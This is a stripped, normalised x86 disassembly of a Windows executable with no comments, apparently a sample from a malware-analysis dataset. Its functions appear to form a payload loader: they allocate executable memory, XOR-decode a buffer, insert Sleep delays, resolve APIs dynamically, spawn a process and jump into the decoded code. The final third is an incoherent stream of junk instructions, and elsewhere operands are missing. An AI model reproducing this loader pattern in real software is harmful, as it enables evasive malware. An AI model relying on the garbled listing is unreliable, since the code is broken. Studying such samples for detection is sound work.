sub_401000
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ edi + 0x30 ] eax
mov eax [ ebp + 0x14 ]
mov [ edi + 0x34 ] eax
lea eax [ edi + 0x18 ]
push eax
push edi
push sub_401123
push ecx
call sub_410249
mov esi eax
add esp 0x10
test esi esi
je r-xdata
lea ecx [ edi + 0x20 ]
mov ecx [ edi + 0x4 ]
movzx eax [ ecx ]
push eax
push ecx
push 0x2
push edi
call sub_40105d
add esp 0x10
jle r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn
movzx esi si
or esi 0x80070000
jmp r-xdata
sub_40105d
push ebp
mov ebp esp
push [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax + 0x1c ]
push [ eax + 0x18 ]
call sub_410289
add esp 0x14
test eax eax
jle r-xdata
pop ebp
retn
movzx eax ax
or eax 0x80070000
sub_401088
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push [ esi + 0x1c ]
push [ esi + 0x18 ]
call sub_4102cc
and [ esi + 0x18 ] 0x0
and [ esi + 0x1c ] 0x0
pop ecx
pop ecx
pop esi
pop ebp
retn
sub_4010a7
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
xor edx edx
push esi
mov esi r--data
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ edx + 0x1 ]
and [ ecx + 0x4 ] 0x0
and [ ecx + 0xc ] 0x0
mov [ ecx ] esi
mov [ ecx + 0x8 ] eax
pop esi
pop ebp
retn
mov edx eax
mov esi eax
lea ecx [ edx + 0x1 ]
mov al [ edx ]
inc edx
test al al
jne r-xdata
sub edx ecx
sub_4010df
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push edi
xor edi edi
mov esi r--data
mov edx edi
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ edx * 2 + 0x2 ]
mov [ ecx + 0x4 ] edi
mov [ ecx + 0xc ] edi
pop edi
mov [ ecx ] esi
mov [ ecx + 0x8 ] eax
pop esi
pop ebp
retn
mov edx eax
mov esi eax
lea ecx [ edx + 0x2 ]
mov ax [ edx ]
add edx 0x2
cmp ax di
jne r-xdata
sub edx ecx
sar edx 0x1
sub_401123
push ebp
mov ebp esp
mov eax [ ebp + 0x28 ]
test eax eax
je r-xdata
pop ebp
retn 0x24
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x1c ]
push edi
mov edi [ ebp + 0x20 ]
sub ecx 0x0
je r-xdata
and [ eax ] 0x0
sub ecx 0x1
jne r-xdata
pop esi
pop edi
pop ebx
push [ eax + 0x34 ]
push [ ebp + 0x24 ]
push edi
push ebx
push ecx
push [ ebp + 0x14 ]
mov ecx esi
push edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call j_sub_40d4a2
call esi
mov ecx [ ebp + 0x18 ]
test dl dl
je r-xdata
mov ecx 0x100
movzx ecx dl
inc ecx
jmp r-xdata
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x18 ]
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ebx
mov [ eax + 0x14 ] edi
jmp r-xdata
sub_40119b
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
or eax [ ebp + 0x10 ]
je r-xdata
mov al 0x1
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x8 ]
mov eax [ edx + 0xc ]
and ecx [ ebp + 0xc ]
and eax [ ebp + 0x10 ]
or ecx eax
je r-xdata
xor al al
pop ebp
retn
mov eax [ edx + 0x10 ]
mov ecx [ edx + 0x14 ]
and eax [ ebp + 0xc ]
and ecx [ ebp + 0x10 ]
cmp eax [ edx + 0x10 ]
jne r-xdata
cmp ecx [ edx + 0x14 ]
je r-xdata
sub_4011d7
push ebp
mov ebp esp
sub esp 0x10
mov al [ r--data ]
mov edx [ ebp + 0xc ]
mov ecx edx
push esi
mov esi [ ebp + 0x8 ]
sub ecx r--data
or ecx 0xb000000
mov eax [ edx ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x8 ]
add edx 0xc
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x4 ]
push ecx
and [ ecx + 0x4 ] 0x0
push [ ebp + 0x18 ]
mov [ ecx ] eax
mov eax [ esi + 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
movzx eax [ eax ]
and [ ecx + 0x14 ] 0x0
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] 0x2
mov [ ecx + 0x10 ] edx
movzx eax [ edx ]
mov [ ecx + 0x18 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov [ ecx + 0x1c ] 0x1
push [ esi + 0x1c ]
push [ esi + 0x18 ]
call sub_410306
add esp 0x1c
pop esi
mov esp ebp
pop ebp
retn
sub_401260
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
push 0x7dc
push 0x0
mov [ esi ] eax
lea eax [ esi + 0x4 ]
push eax
call sub_40dea0
add esp 0xc
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4012f0
push ebp
mov ebp esp
push 0xffffffff
push sub_44c242
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ebx [ ebp + 0xc ]
lea eax [ ebx + 0x7dc ]
push eax
mov [ ebp - 0x10 ] eax
call sub_40c385
mov edi eax
mov [ ebp + 0xc ] eax
add esi 0x4
mov ecx 0x1f7
push ebx
push [ ebp + 0x8 ]
[ edi ] [ esi ]
lea ecx [ eax + 0x7dc ]
push ecx
call sub_40d920
push 0x318
call sub_40c344
add esp 0x14
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edi edi
mov ecx eax
call sub_4015f0
mov edi eax
jmp r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push eax
call sub_40c385
add esp 0x4
mov esi eax
mov ecx edi
push esi
push [ ebp - 0x10 ]
push ebx
call sub_401710
push eax
push esi
push r--data
mov ecx edi
call sub_4017f0
push 0x0
push 0x1
push 0x1
mov ecx edi
mov [ ebp - 0x4 ] 0xffffffff
call sub_4017b0
push 0x0
lea eax [ ebx + 0x7dc ]
mov ecx edi
mov ebx [ ebp + 0xc ]
push eax
push ebx
call sub_401710
test eax eax
je r-xdata
sub_401400
push ebp
mov ebp esp
push 0xffffffff
push sub_44c280
mov eax [ fs : 0x0 ]
push eax
mov eax 0x1028
call sub_40c3a0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
push 0x208
mov [ ebp - 0x102c ] eax
call sub_40c385
push 0x318
call sub_40c344
add esp 0x8
mov [ ebp - 0x1028 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_4015f0
jmp r-xdata
push 0x3e8
call edi
push 0x3e8
call edi
push 0x3e8
call edi
push 0x3e8
call edi
push 0x3e8
call edi
push 0x3e8
call edi
push 0x0
call sub_417218
int3
push 0x0
push 0x0
push ebx
mov ecx eax
call sub_4016b0
push 0x40
push 0x3000
push eax
push 0x0
mov [ ebp - 0x1030 ] eax
call [ VirtualAlloc@IAT ]
mov esi eax
test esi esi
je r-xdata
mov edi [ Sleep@IAT ]
mov [ ebp - 0x1028 ] eax
mov [ ebp - 0x4 ] 0xffffffff
test ebx ebx
je r-xdata
mov ecx [ ebp - 0x1028 ]
push esi
push 0x0
push ebx
call sub_4016b0
test eax eax
je r-xdata
push [ ebp - 0x1030 ]
call sub_40c385
add esp 0x4
mov esi eax
lea eax [ ebp - 0x1034 ]
push eax
push 0x40
push [ ebp - 0x1030 ]
push esi
call [ VirtualProtect@IAT ]
cmp [ esi ] 0x0
je r-xdata
lea eax [ esi + 0x7dc ]
xor esi esi
mov [ ebp - 0x102c ] eax
lea ebx [ ebp - 0x10 ]
push [ ebp - 0x102c ]
lea ecx [ ebp - 0x1024 ]
call sub_401a90
push esi
lea ecx [ ebp - 0x1024 ]
mov [ ebp - 0x4 ] 0x1
call sub_401cd0
lea ecx [ ebp - 0x1024 ]
call sub_401e10
lea ecx [ ebp - 0x1024 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_401b30
push 0x1
call edi
mov eax [ ebx ]
lea ebx [ ebx - 0x4 ]
add eax 0x10
xor eax [ ebp + esi * 4 - 0x420 ]
xor eax 0x8f
mov [ ebp + esi * 4 - 0x420 ] eax
inc esi
cmp esi 0x104
jl r-xdata
cmp [ ebp - 0x41c ] 0x2710
je r-xdata
push 0xffffffff
call edi
call [ ebp - 0x102c ]
sub_4015c0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
lea edi [ ecx + 0x4 ]
mov ecx 0x1f7
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
retn 0x4
sub_401620
push esi
push edi
push 0x0
mov edi ecx
call sub_42936c
push eax
call sub_417265
add esp 0x8
call sub_417244
xor esi esi
movd xmm0 eax
cvtdq2pd xmm0 xmm0
divsd xmm0 [ r--data ]
mulsd xmm0 [ r--data ]
addsd xmm0 [ r--data ]
cvttsd2si eax xmm0
mov [ edi + 0x104 ] eax
test eax eax
je r-xdata
pop edi
mov eax esi
pop esi
retn
nop [ eax ] eax
call sub_417244
movd xmm0 eax
cvtdq2pd xmm0 xmm0
divsd xmm0 [ r--data ]
mulsd xmm0 [ r--data ]
addsd xmm0 [ r--data ]
cvttsd2si ecx xmm0
mov [ esi + edi ] cl
inc esi
cmp esi [ edi + 0x104 ]
jb r-xdata
sub_4016b0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ebx ecx
mov esi edi
mov eax [ edi + 0x4 ]
mov [ ebx + 0x104 ] eax
push [ edi + 0x4 ]
mov eax [ edi + 0x8 ]
add eax edi
push eax
push ebx
call sub_40d920
add edi [ edi + 0x10 ]
add esp 0xc
mov eax [ esi ]
mov ecx [ esi + 0xc ]
mov [ ebx + 0x10c ] eax
sub eax 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push [ ebp + 0x10 ]
push ecx
push edi
mov ecx ebx
call sub_4018c0
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_401710
push ebp
mov ebp esp
push ebx
push edi
mov edi ecx
cmp [ edi + 0x108 ] 0x0
je r-xdata
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
call sub_401620
mov eax [ edi + 0x10c ]
sub eax 0x1
jne r-xdata
mov eax [ edi + 0x10c ]
mov [ ebx ] eax
mov eax [ edi + 0x104 ]
mov [ ebx + 0x4 ] eax
mov ecx [ ebx + 0x4 ]
mov eax [ ebp + 0xc ]
push esi
mov [ ebx + 0xc ] eax
lea eax [ ecx + 0x14 ]
mov [ ebx + 0x8 ] 0x14
push ecx
mov [ ebx + 0x10 ] eax
lea eax [ ebx + 0x14 ]
push edi
push eax
call sub_40d920
add esp 0xc
add ebx [ ebx + 0x10 ]
pop esi
mov eax [ edi + 0x104 ]
mov ecx [ ebp + 0xc ]
add eax 0x14
pop edi
add eax ecx
pop ebx
pop ebp
retn 0xc
push ebx
push [ ebp + 0xc ]
mov ecx edi
push [ ebp + 0x8 ]
call sub_401950
mov ecx eax
mov eax [ edi + 0x104 ]
add eax 0x14
pop edi
add eax ecx
pop ebx
pop ebp
retn 0xc
sub_4017b0
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
mov [ ecx + 0x108 ] al
mov eax [ ebp + 0xc ]
push 0x104
push [ ebp + 0x10 ]
mov [ ecx + 0x10c ] eax
lea eax [ ecx + 0x110 ]
push eax
call [ lstrcpynW@IAT ]
mov eax 0x1
pop ebp
retn 0xc
sub_4017f0
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
push r--data
push eax
lea eax [ ebp - 0x14 ]
push eax
call sub_41775d
push [ ebp - 0x14 ]
push 0x1f
push 0x1
push r--data
call sub_417bd2
mov edi [ ebp + 0x10 ]
add esp 0x1c
xor esi esi
test edi edi
je r-xdata
push [ ebp - 0x14 ]
push 0x6
push 0x1
push r--data
call sub_417bd2
push [ ebp - 0x14 ]
call sub_417838
add esp 0x14
push 0x0
push 0x0
push r--data
push 0x0
call [ MessageBoxW@IAT ]
push 0x0
call sub_417218
int3
mov al [ ebx + esi ]
xorps xmm0 xmm0
cmp al 0x10
mov [ ebp - 0x10 ] 0x10
movzx eax al
push eax
movq [ ebp - 0xf ] xmm0
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x7 ] 0x0
jae r-xdata
push r--data
push eax
call sub_401a10
add esp 0xc
push r--data
push 0xa
push eax
call sub_401a50
add esp 0x10
jmp r-xdata
push [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
push 0x5
push 0x1
push eax
call sub_417bd2
inc esi
add esp 0x10
cmp esi edi
jb r-xdata
sub_4018c0
push ebp
mov ebp esp
sub esp 0x8
mov eax ecx
push ebx
push edi
mov edi [ ebp + 0x10 ]
mov ebx [ eax + 0x104 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
test edi edi
jne r-xdata
push esi
xor esi esi
test eax eax
je r-xdata
pop edi
add eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
pop esi
pop edi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebp + 0x8 ]
add eax 0xffffffec
sub ecx edi
mov [ ebp - 0x8 ] eax
mov [ ebp + 0x8 ] ecx
nop [ eax ] eax
cmp esi [ ebp - 0x8 ]
jbe r-xdata
lea edx [ esi + edi ]
mov edi [ ebp - 0x4 ]
mov cl [ ecx + edx ]
xor cl [ eax + edi ]
inc eax
mov edi [ ebp + 0x10 ]
mov [ edx ] cl
mov ecx [ ebp + 0x8 ]
cmp eax ebx
jb r-xdata
mov eax [ ebp + 0xc ]
inc esi
mov ecx [ ebp + 0x8 ]
cmp esi eax
jb r-xdata
push edi
push r--data
call sub_4019e0
add esp 0x8
xor eax eax
test ebx ebx
je r-xdata
sub_401950
push ebp
mov ebp esp
sub esp 0x8
mov eax ecx
push ebx
push edi
mov edi [ ebp + 0x10 ]
mov ebx [ eax + 0x104 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
test edi edi
je r-xdata
pop edi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push esi
xor esi esi
test eax eax
je r-xdata
pop esi
mov ecx [ ebp + 0x8 ]
add eax 0xffffffec
sub ecx edi
mov [ ebp - 0x8 ] eax
mov [ ebp + 0x8 ] ecx
cmp esi [ ebp - 0x8 ]
jbe r-xdata
nop [ eax + eax ] eax
mov eax [ ebp + 0xc ]
inc esi
mov ecx [ ebp + 0x8 ]
cmp esi eax
jb r-xdata
push edi
push r--data
call sub_4019e0
add esp 0x8
lea edx [ esi + edi ]
mov edi [ ebp - 0x4 ]
mov cl [ ecx + edx ]
xor cl [ eax + edi ]
inc eax
mov edi [ ebp + 0x10 ]
mov [ edx ] cl
mov ecx [ ebp + 0x8 ]
cmp eax ebx
jb r-xdata
xor eax eax
test ebx ebx
je r-xdata
sub_4019e0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push 0x1
call sub_41739e
add esp 0x4
lea ecx [ ebp + 0xc ]
push ecx
push 0x0
push esi
push eax
call sub_4019d0
push [ eax + 0x4 ]
push [ eax ]
call sub_428ddc
add esp 0x18
pop esi
pop ebp
retn
sub_401a10
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push 0x0
push [ ebp + 0xc ]
push 0xffffffff
push [ ebp + 0x8 ]
call sub_4019d0
mov ecx [ eax ]
push [ eax + 0x4 ]
or ecx 0x1
push ecx
call sub_4290f4
or ecx 0xffffffff
add esp 0x1c
test eax eax
cmovs eax ecx
pop ebp
retn
sub_401a50
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4019d0
push [ eax + 0x4 ]
push [ eax ]
call sub_42913c
or ecx 0xffffffff
add esp 0x1c
test eax eax
cmovs eax ecx
pop ebp
retn
sub_401a90
push ebp
mov ebp esp
push ebx
mov ebx ecx
push esi
push 0x104
lea eax [ ebx + 0x14 ]
mov [ ebx + 0xc00 ] 0x0
push eax
push [ ebp + 0x8 ]
call [ GetModuleFileNameW@IAT ]
push r--data
call [ LoadLibraryA@IAT ]
push r--data
push eax
mov [ ebx ] eax
call [ GetProcAddress@IAT ]
push r--data
push [ ebx ]
mov esi eax
call [ GetProcAddress@IAT ]
push r--data
push [ ebx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] esi
call eax
mov [ ebx + 0x4 ] eax
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
sub_401b40
push ebp
mov ebp esp
sub esp 0x260
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
mov edi ecx
lea eax [ edi + 0x21c ]
push eax
call [ lstrlenW@IAT ]
mov eax [ edi + 0x4 ]
push r--data
call eax
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
xor eax eax
pop edi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
mov ecx [ edi + 0x8 ]
push esi
push r--data
push [ edi ]
call ecx
push r--data
mov esi eax
mov eax [ edi + 0x8 ]
push ebx
call eax
test esi esi
je r-xdata
pop esi
pop edi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn
test eax eax
je r-xdata
push 0x208
lea eax [ ebp - 0x20c ]
push 0x0
push eax
call sub_40dea0
add esp 0xc
lea eax [ ebp - 0x20c ]
push 0x104
push r--data
push eax
call [ lstrcpynW@IAT ]
mov eax [ edi + 0x42c ]
mov esi [ lstrcatW@IAT ]
cmp eax 0x80000001
jne r-xdata
cmp eax 0x80000002
jne r-xdata
push r--data
jmp r-xdata
lea eax [ edi + 0x430 ]
push eax
lea eax [ ebp - 0x20c ]
push eax
call esi
push r--data
lea eax [ ebp - 0x20c ]
push eax
call esi
lea eax [ edi + 0x624 ]
push eax
lea eax [ ebp - 0x20c ]
push eax
call esi
push r--data
lea eax [ ebp - 0x20c ]
push eax
call esi
lea eax [ edi + 0x21c ]
push eax
lea eax [ ebp - 0x20c ]
push eax
call esi
push r--data
lea eax [ ebp - 0x20c ]
push eax
call esi
push 0x40
lea eax [ ebp - 0x25c ]
mov [ ebp - 0x260 ] 0x44
push 0x0
push eax
call sub_40dea0
add esp 0xc
lea eax [ ebp - 0x21c ]
push eax
lea eax [ ebp - 0x260 ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x20c ]
push eax
push 0x0
call [ CreateProcessW@IAT ]
push r--data
lea eax [ ebp - 0x20c ]
push eax
call esi
sub_401cd0
push ebp
mov ebp esp
sub esp 0x20c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov ebx ecx
push 0x7dc
push 0x0
lea edi [ ebx + 0x424 ]
push edi
call sub_40dea0
mov esi [ ebp + 0x8 ]
add esp 0xc
mov ecx 0x1f7
[ edi ] [ esi ]
lea esi [ ebx + 0x818 ]
push esi
call [ lstrlenW@IAT ]
sub eax 0x1
js r-xdata
cmp [ esi ] 0x25
jne r-xdata
lea ecx [ ebx + 0x818 ]
lea ecx [ ecx + eax * 2 ]
lea eax [ ebx + 0xa0c ]
push eax
push esi
add esi 0x2
push r--data
push esi
call sub_40dffa
add esp 0x8
test eax eax
je r-xdata
xor edx edx
mov [ ecx ] dx
sub ecx 0x2
sub eax 0x1
jns r-xdata
mov ecx [ ebp - 0x4 ]
mov eax 0x1
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn 0x4
push r--data
push esi
call sub_40dffa
mov edi eax
add esp 0x8
sub edi esi
sar edi 0x1
je r-xdata
cmp [ ecx ] 0x5c
jne r-xdata
push 0x208
lea eax [ ebp - 0x20c ]
push 0x0
push eax
call sub_40dea0
add esp 0xc
xor eax eax
mov [ esi + edi * 2 ] ax
mov eax [ ebx + 0x8 ]
push r--data
push [ ebx ]
call eax
push 0x104
lea ecx [ ebp - 0x20c ]
push ecx
push esi
call eax
mov eax 0x25
mov [ esi + edi * 2 ] ax
lea eax [ esi + 0x2 ]
lea eax [ eax + edi * 2 ]
push eax
lea eax [ ebp - 0x20c ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebx + 0xa0c ]
push eax
lea eax [ ebp - 0x20c ]
push eax
jmp r-xdata
push r--data
lea eax [ ebx + 0x21c ]
push 0x104
push eax
call sub_404a20
add esp 0x14
sub_401e10
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x60 ] ecx
call sub_417244
cdq
mov ecx 0x7fff
idiv ecx
imul edx eax 0xfffff83a
add edx 0xa
mov [ ebp - 0x5c ] edx
mov [ ebp - 0x90 ] 0x0
mov [ ebp - 0x64 ] 0x0
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov eax [ ebp - 0x5c ]
add eax 0x1
mov [ ebp - 0x5c ] eax
cmp [ ebp - 0x5c ] 0x3e8
je r-xdata
mov eax [ ebp - 0x90 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn
mov [ ebp - 0x68 ] 0x0
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x68 ]
cmp edx [ ebp - 0x5c ]
jae r-xdata
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov ecx [ ebp - 0x64 ]
cmp ecx [ ebp - 0x5c ]
je r-xdata
mov eax [ ebp - 0x64 ]
add eax [ ebp - 0x68 ]
mov [ ebp - 0x64 ] eax
jmp r-xdata
cmp [ ebp - 0x64 ] 0x1
je r-xdata
call sub_417244
cdq
mov ecx 0x7fff
idiv ecx
imul edx eax 0xfffff83a
add edx 0xa
mov [ ebp - 0x64 ] edx
mov ecx [ ebp - 0x68 ]
add ecx 0x1
mov [ ebp - 0x68 ] ecx
mov eax [ ebp - 0x60 ]
add eax 0x21c
push eax
mov ecx [ ebp - 0x60 ]
add ecx 0x14
push ecx
call [ lstrcmpiW@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x94 ] eax
mov [ ebp - 0x98 ] ecx
mov [ ebp - 0x6c ] edx
push esi
push ebx
sub esp 0x10
call sub_40259f
retn 0x50
sub_401f27
jne r-xdata
jno r-xdata
or edi 0x9a890f
add [ eax ] al
add esp 0x8
jno r-xdata
sub edx 0x11e890f
add [ eax ] al
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf44e3c9
pop edx
jno r-xdata
mov ecx 0xe981637f
jae r-xdata
sub ecx 0xe1813e75
add [ eax + eax - 0x7af10000 ] 0xea810971
jns r-xdata
call [ 0x40246c81 ]
add [ edi ] ebx
inc eax
add [ ebx + 0xf5a10ec ] al
xchg [ esi ] esp
add [ eax ] eax
add bh bh
and eax 0xce8d0f
add [ eax ] al
jg r-xdata
and ecx 0xd7850f
add [ eax ] al
jns r-xdata
jge 0xffffffffb8af9f29
pushfd
call sub_401f12
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
push ebp
call sub_401f27
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
jae r-xdata
or edi 0x8d0f2c73
ja r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
pop ecx
jno r-xdata
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jae r-xdata
jae r-xdata
jg r-xdata
jne 0x24c12ff2
jne r-xdata
call sub_401fb2
ja 0x504a3b9
call 0x529077f2
add esp 0x4
jns r-xdata
mov eax 0xc7819173
ja r-xdata
jge 0x71fc60fa
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jns r-xdata
jmp 0xcaa8d2
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jae r-xdata
sub eax 0x4d795a58
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
add esp 0x4
jne r-xdata
jg 0xffffffffff96a329
pop eax
jns r-xdata
sub eax 0xfec5e89c
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3a8f3
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1df82
jns r-xdata
xor edx 0x81257159
r-xdata
jno 0x16400d6c
pop edx
jg r-xdata
jpo 0xf70988f
push eax
push edi
push ebp
push ecx
and ecx 0xff378f0f
ja r-xdata
and ecx 0xf681ad79
jno r-xdata
pop ecx
or eax 0xf04c483
mov ebp ebp
add esp 0x4
jno r-xdata
je 0xfffffffffed0a39b
jne r-xdata
jno 0xffffffff834f7796
jno r-xdata
sub esi 0x89641f79
ja r-xdata
jno r-xdata
mov ebx 0xf04c483
ja r-xdata
call 0xffc9a91
cmp [ edi + 0x7f ] 0x81

ja r-xdata
jae r-xdata
je 0xffffffff814fc168
jne 0xffffffffeac128c2
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
push ecx
push edx
push ebp
sub esp 0x4
call sub_4021be
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jns r-xdata
mov edi 0x9c555757
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
jg r-xdata
jg 0xffffffff9c94739d
ja r-xdata
jns r-xdata
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1a0bc
jne r-xdata
sub edi 0x64244481
cwde
sub [ eax ] al
add esp 0x4
ja r-xdata
jl 0xffffffffffacb21f
jae r-xdata
ja 0xffffffffa3c331b7
jae r-xdata
xor ebx 0xff728f0f
jae r-xdata
ja 0xffffffff89a45e58
push esi
push esi
call sub_40209d
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd7994
push edx
call sub_401fd3
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jge r-xdata
call [ 0xffffffffca81677d ]
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jg r-xdata
jpo 0xdea79d
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
jg r-xdata
and ebx 0xff5a870f
jg r-xdata
pop edx
pop edx
jae r-xdata
je 0xffffffffa3a4c568
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_40258c
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
call sub_402052
